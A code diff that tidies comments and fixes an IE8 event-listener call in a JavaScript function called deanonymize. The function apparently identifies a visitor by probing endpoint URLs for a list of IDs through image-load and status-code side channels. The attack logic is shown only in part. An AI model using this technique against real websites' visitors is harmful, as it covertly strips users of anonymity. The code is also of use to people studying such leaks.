@@ -9,14 +9,19 @@
 function deanonymize(attackMethod, endpoint, idList, callback) {
     var elNodes, testFn;
     var output = [];
-    // register a new cross-browser event listener
+    // Register a new cross-browser event listener.
     var addListener = (function() {
         return (window.addEventListener) ? window.addEventListener :
-            // for IE8 and earlier versions support
+            // For IE8 and earlier versions support.
             function (evName, callback) {
-                window.attachEvent.call(this, 'on'+evName, callback);
+                this.attachEvent('on' + evName, callback);
             };
     }());
+    /**
+     * Create new DOM elements.
+     * @param tagName {string}, element's tag name.
+     * @return {array}, an array of DOM nodes.
+     */
     var createElements = function(tagName) {
         var i, l, el;
         var elNodes = [];
@@ -38,6 +43,11 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
         }
         return elNodes;
     };
+    /**
+     * Conduct tests in regard to a given function.
+     * @param testFn {function}, element's tag name.
+     * @return void.
+     */
     var assess = function(testFn) {
         var i, l;
         for (i = 0, l = elNodes.length; i < l; i++) {
@@ -51,6 +61,11 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
     };
     if (attackMethod === 'redirection') {
         elNodes = createElements('img');
+        /**
+         * Test if an image node was loaded or not.
+         * @param imageNode {object}, a DOM image node.
+         * @return {boolean}.
+         */
         testFn = function(imgNode) {
             if (imgNode.naturalHeight !== 0 && imgNode.naturalWidth !== 0) {
                 return true;
@@ -60,6 +75,11 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
     } else if(attackMethod === 'statusCode') {
         elNodes = (/chrome/i.test(navigator.userAgent)) ? createElements('link') :
                            createElements('script');
+        /**
+         * Test if a given element is a child of `documentElement` or not.
+         * @param el {object}, a DOM element.
+         * @return {boolean}.
+         */
         testFn = function(el) {
             if (el.parentNode !== document.documentElement) {
                 return true;
@@ -67,5 +87,5 @@ function deanonymize(attackMethod, endpoint, idList, callback) {
             return false;
         };
     }
-    addListener.call(window, 'load', function() {assess(testFn);});
+    addListener.call(window, 'load', function() { assess(testFn); });
 }
